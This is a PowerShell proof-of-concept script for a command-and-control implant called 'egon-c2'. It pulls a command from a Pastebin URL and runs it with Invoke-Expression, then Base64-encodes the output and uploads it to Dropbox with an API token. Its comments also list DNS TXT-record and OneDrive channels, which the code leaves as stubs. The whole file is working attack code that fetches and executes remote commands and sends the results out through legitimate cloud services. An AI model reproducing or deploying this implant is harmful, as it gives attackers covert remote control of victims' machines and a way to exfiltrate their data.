#
# egon-c2 p-o-c
# PowerShell script for Windows O.S.
# author: rocco <sheliak> sicilia
# 

#
# example
# .\drop.ps1 -inmode pbin   -pbinsource {URL}   -outmode dbox   -token {token}      // get command from PasteBin and save the output on DropBox
# .\drop.ps1 -inmode pbin   -pbinsource {URL}   -outmode oned   -token {token}      // get command from PasteBin and save the output on OneDrive
# .\drop.ps1 -inmode dns    -record {record}    -outmode dbox   -token {token}      // get command from TXT DNS record and save the output on DropBox
#

Param (
    # define channel mode
    [Parameter(Mandatory=$true,HelpMessage="Command's source type is needed!")]
    [string]$inmode,
    [Parameter(Mandatory=$true,HelpMessage="Output destination is needed!")]
    [string]$outmode,
    [string]$token,

    # pbin cmd params
    [Parameter(ParameterSetName="pbinsource")]
    [string]$pbinsource
)

# get command string
switch ($inmode) {
    'pbin' {
        Write-Host "Selected mode *pastebin*" ### test URL https://pastebin.com/raw/uVdCij0r

        # check URL and CMD
        Write-Host "Verify command from $pbinsource"
        try {
            $rawcmd = Invoke-webrequest -URI "$pbinsource"
        }
        catch {
            Write-Host "URL not valid" -ForegroundColor Red
            break
        }

        # check NOP/NULL
        if (( "$rawcmd" -eq 'NOP') -Or ( "$rawcmd" -eq $null )) {
            Write-Host "Skip..."
        }
        else {
            # cmd confirm
            Write-Host "The command is " -NoNewline
            Write-Host "$rawcmd" -ForegroundColor Green
            # execute cmd
            $content = Invoke-Expression $rawcmd
            Write-Host "Command output:"
            Write-Host $content -ForegroundColor Cyan
        }
    }

    'dbox' {
        Write-Host "Selected mode *dropbox*"
    }
}

# create content file
$encoded_content = [System.Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($content))
Write-Host "Endcoded content: $encoded_content"

# send command output
switch ($outmode) {
    'pbin' {
        Write-Host "Send output to PasteBin..."
    }
    'dbox' {
        Write-Host "Send output to DropBox drive..."
        $encoded_content | Out-File -FilePath "$env:USERPROFILE\dbox_outfile.txt"
        $destFile = "/$(get-date -f yyyyMMddHHmm)_outfile.txt"

        $rargs = '{ "path": "' + $destFile + '", "mode": "add", "autorename": true, "mute": false }'
        $auth = "Bearer " + $token
        $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
        $headers.Add("Authorization", $auth)
        $headers.Add("Dropbox-API-Arg", $rargs)
        $headers.Add("Content-Type", 'application/octet-stream')
        Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $env:USERPROFILE\dbox_outfile.txt -Headers $headers
    }
    'oned' {
        Write-Host "Send output to OneDrive drive..."
    }
}
